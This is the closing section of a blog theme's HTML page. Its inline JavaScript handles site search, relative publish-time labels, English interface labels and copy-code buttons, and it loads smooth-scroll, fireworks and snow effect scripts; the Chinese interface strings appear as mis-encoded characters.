          contents.forEach(content => {
            let title = content.title;
            let positions = [];
            let find = false;
            segments.forEach((segment) => {
              if (content.title.includes(segment)) {
                find = true;
                positions.push({
                  start: content.title.indexOf(segment),
                  count: segment.length
                })
              } else if (content.details.includes(segment)) {
                find = true;
              }
            });
            if (find) {
              finds.push({
                title: content.title,
                link: content.link,
                positions
              });
            }
          })
          appendResults(0);
          statCount.textContent = finds.length;
          statTimes.textContent = Date.now() - start;
        }, delay)
      }
    }
    searchBox.addEventListener('input', search(200));
  }()
</script>

<input hidden id="copy" />
<script>
  !function () {
    let times = document.querySelectorAll('.publish-time');
    for (let i = 0; i < times.length; i++) {
      let date = times[i].dataset.t;
      let time = Math.floor((new Date().getTime() - new Date(date).getTime()) / 1000);
      if (time < 60) {
        str = time + 'ç§’ä¹‹å‰';
      } else if (time < 3600) {
        str = Math.floor(time / 60) + 'åˆ†é’Ÿä¹‹å‰';
      } else if (time >= 3600 && time < 86400) {
        str = Math.floor(time / 3600) + 'å°æ—¶ä¹‹å‰';
      } else if (time >= 86400 && time < 259200) {
        str = Math.floor(time / 86400) + 'å¤©ä¹‹å‰';
      } else {
        str = times[i].textContent;
      }
      times[i].textContent = str;
    }
  }();
</script>

<script>
  let language = '';
  if (language !== '') {
    let map = new Map();
    if (language === 'en') {
      map.set('search', 'Search');
      map.set('category', 'Categories');
      map.set('article', 'Articles');
      map.set('tag', 'Tags');
      map.set('top', 'Top');
      map.set('publish', 'published');
      map.set('minute', ' minutes');
      map.set('read-more', 'Read More');
      map.set('view', 'View');
      map.set('words', ' words');
      map.set('category-in', 'category in');
      map.set('preview', 'Meta');
      map.set('index', 'Toc');
      map.set('no-archives', "You haven't created yet");
      map.set('archives', " articles in total");
      map.set('cloud-tags', " tags in total");
      map.set('copyright', "Copyright: ");
      map.set('author', "Author: ");
      map.set('link', "Link: ");
      map.set('leave-message', "Leave a message");
      map.set('format', "Links Format");
      map.set('site-name', "Name: ");
      map.set('site-link', "Link: ");
      map.set('site-desc', "Desc: ");
      map.set('stat', " related results, taking ");
      map.set('stat-time', " ms");
      map.set('site-img', "Image: ");
    }

    if (map.size > 0) {
      let lanElems = document.querySelectorAll('.language');
      lanElems.forEach(elem => {
        let lan = elem.dataset.lan, text = map.get(lan);
        if (elem.__proto__ === HTMLInputElement.prototype) {
          elem.placeholder = text
        } else {
          if (elem.dataset.count) {
            text = elem.dataset.count + text;
          }
          elem.textContent = text;
        }
      })
    }
  }

  window.Clipboard = (function (window, document, navigator) {
    var textArea,
      copy;

    // åˆ¤æ–­æ˜¯ä¸æ˜¯iosç«¯
    function isOS() {
      return navigator.userAgent.match(/ipad|iphone/i);
    }
    //åˆ›å»ºæ–‡æœ¬å…ƒç´ 
    function createTextArea(text) {
      textArea = document.createElement('textArea');
      textArea.value = text;
      textArea.style.width = 0;
      textArea.style.height = 0;
      textArea.clientHeight = 0;
      textArea.clientWidth = 0;
      document.body.appendChild(textArea);
    }
    //é€‰æ‹©å†…å®¹
    function selectText() {
      var range,
        selection;

      if (isOS()) {
        range = document.createRange();
        range.selectNodeContents(textArea);
        selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        textArea.setSelectionRange(0, 999999);
      } else {
        textArea.select();
      }
    }

    //å¤åˆ¶åˆ°å‰ªè´´æ¿
    function copyToClipboard() {
      try {
        document.execCommand("Copy")
      } catch (err) {
        alert("å¤åˆ¶é”™è¯¯ï¼è¯·æ‰‹åŠ¨å¤åˆ¶ï¼")
      }
      document.body.removeChild(textArea);
    }

    copy = function (text) {
      createTextArea(text);
      selectText();
      copyToClipboard();
    };

    return {
      copy: copy
    };
  })(window, document, navigator);

  function copyCode(e) {
    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
      let code = e.currentTarget.querySelector('code');
      var text = code.innerText;
      if (e.srcElement.textContent === 'å¤åˆ¶æˆåŠŸ') {
        return;
      }
      e.srcElement.textContent = 'å¤åˆ¶æˆåŠŸ';
      (function (elem) {
        setTimeout(() => {
          if (elem.textContent === 'å¤åˆ¶æˆåŠŸ') {
            elem.textContent = 'å¤åˆ¶ä»£ç '
          }
        }, 1000);
      })(e.srcElement)
      Clipboard.copy(text);
    }
  }

  let pres = document.querySelectorAll('pre');
  pres.forEach(pre => {
    let code = pre.querySelector('code');
    let copyElem = document.createElement('span');
    copyElem.classList.add('copy-code');
    copyElem.textContent = 'å¤åˆ¶ä»£ç ';
    pre.appendChild(copyElem);
    pre.onclick = copyCode
  })

</script>
<script src="/media/js/motion.js"></script>


  <script
    src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
  <script>
    var scroll = new SmoothScroll('a[href*="#"]', {
      speed: 200
    });
  </script>



<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas>
<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
<script type="text/javascript" src="/media/js/mouse/fireworks.js"></script>


  <script src="/media/js/cool.js"></script>



  <div class="snow-container"></div>
  <script src="/media/js/bg/snow.js"></script>

</html>